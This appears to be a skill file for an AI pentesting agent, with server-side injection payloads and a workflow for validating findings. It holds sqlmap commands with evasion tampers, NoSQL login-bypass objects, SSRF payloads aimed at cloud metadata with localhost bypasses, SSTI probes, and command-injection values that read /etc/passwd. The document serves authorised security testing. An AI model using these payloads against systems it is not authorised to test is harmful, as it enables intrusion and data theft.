---
name: injection-testing
description: Injection vulnerability testing covering SQLi, NoSQLi, SSRF, command injection, and SSTI. For XSS use the dedicated `xss` skill.
allowed-tools: Read, Grep, Glob, Bash
---
# Injection Testing Skill

> **XSS lives in its own skill** (`xss`) — reflected/stored/DOM with the
> screenshot/out-of-band validation it needs. This skill covers server-side
> injection: SQLi, NoSQLi, SSRF, command injection, SSTI.

## SQL Injection (WSTG-INPV-05)
### Automated
    sqlmap -u URL --data=JSON -H "Content-Type: application/json" -p param --batch --level=5 --risk=3
    sqlmap -r request.txt --batch --level=5 --risk=3 --tables
    sqlmap -u URL --tamper=space2comment,randomcase --random-agent --batch

## NoSQL Injection
    {"username": {"$gt": ""}, "password": {"$gt": ""}}
    {"username": {"$regex": "^admin"}}

## SSRF (API7:2023)
    {"url": "http://127.0.0.1"}, {"url": "http://169.254.169.254/latest/meta-data/"}
    IP bypasses: 0177.0.0.1, 2130706433, 0x7f000001, [::1], 127.1

## SSTI (WSTG-INPV-18)
    {{7*7}} Jinja2/Twig, ${{7*7}} FreeMarker, <%= 7*7 %> ERB

## Command Injection (WSTG-INPV-12)
    {"filename": "test; id"}, {"host": "target | cat /etc/passwd"}

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** Confirm out-of-band (OOB DNS/HTTP callback for blind SQLi/SSRF/RCE) or via a deterministic true/false differential.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

**Produce the proof with the harness, then promote from it.** The primitive writes
`$PROJECT_DIR/evidence/<id>/*.json`; `--from-evidence` reads that record and promotes
only if it says `confirmed`, carrying the class, control and method across:

```bash
# 1. record the class up front so the evidence gate arms itself
bash scripts/finding.sh --project-dir "$PROJECT_DIR" --agent specter --severity high \
  --title '<what you proved>' --description '<...>' --impact '<...>' --class injection

# 2. produce the proof
python3 scripts/confirm/oob-client.py mint          # plant the URL in the injectable param
PROJECT_DIR="$PROJECT_DIR" python3 scripts/confirm/oob-client.py verdict NONCE SPE-NNN injection

# 3. promote from the artifact
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --from-evidence
```

Promoting by hand (below) is the fallback for when the harness cannot reach the target.


```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method out-of-band \
  --negative-control "<what you proved, and the control result>" --by specter
```
